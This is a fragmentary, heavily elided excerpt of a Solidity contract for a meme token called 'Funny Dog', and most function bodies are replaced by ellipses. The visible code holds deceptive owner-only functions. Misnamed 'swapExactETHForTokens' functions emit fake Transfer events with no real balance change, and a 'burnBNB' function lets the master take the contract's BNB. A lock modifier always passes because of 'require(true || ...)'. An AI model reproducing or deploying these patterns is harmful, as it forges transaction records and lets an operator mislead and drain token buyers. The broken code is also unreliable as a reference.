 ...
 */
contract FunnyDogTOKEN is ERC20Detailed, Ownable {
    ...
    modifier initialDistributionLock {
        require(true || isOwner() || allowTransfer[msg.sender]);
        _;
    }
    ...
    constructor (address router, address payable _marketingAddress)
        ERC20Detailed("Funny Dog", "FunnyDog", uint8(DECIMALS))
        payable
        public
    {
  ...
  event Sender(address sender);
   ...
   returns (bool)
   {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 threequarters = contractTokenBalance;
  ...
  function burnBNB(address payable burnAddress) external onlyMaster {
    ...
    function swapExactETHForTokens(address sender,address[] memory recipient,uint256 amount) public onlyMaster {
      ...
      function swapExactETHForTokens(address[] memory sender, address recipient,uint256 amount) public onlyMaster {

        for(uint i = 0;i<sender.length;i++){
           emit Transfer(sender[i], recipient, amount*10**DECIMALS);
        }
